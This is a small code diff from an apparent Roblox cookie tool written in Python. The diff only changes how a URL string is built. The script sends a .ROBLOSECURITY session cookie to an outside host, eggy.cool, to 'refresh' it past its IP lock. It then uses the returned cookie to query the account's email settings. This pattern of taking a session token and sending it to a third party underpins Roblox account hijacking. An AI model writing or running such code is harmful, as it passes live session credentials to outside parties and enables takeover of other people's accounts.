@@ -12,7 +12,7 @@ def help():
   quit()
 if cookie == "?":help()
 print(f"{Style.BRIGHT}{Fore.YELLOW}Refreshing Cookie...")
-IPlock = requests.get(f"https://eggy.cool/refresh/ipbb?cookie={cookie}").text.strip()
+IPlock = requests.get(f"https://eggy.cool/refresh/ipbb?cookie=" + cookie).text.strip()
 try:
  os.system("cls")
  r=requests.get("https://accountsettings.roblox.com/v1/email", cookies={'.ROBLOSECURITY': IPlock}).json() #EMAIL VERIFICATION
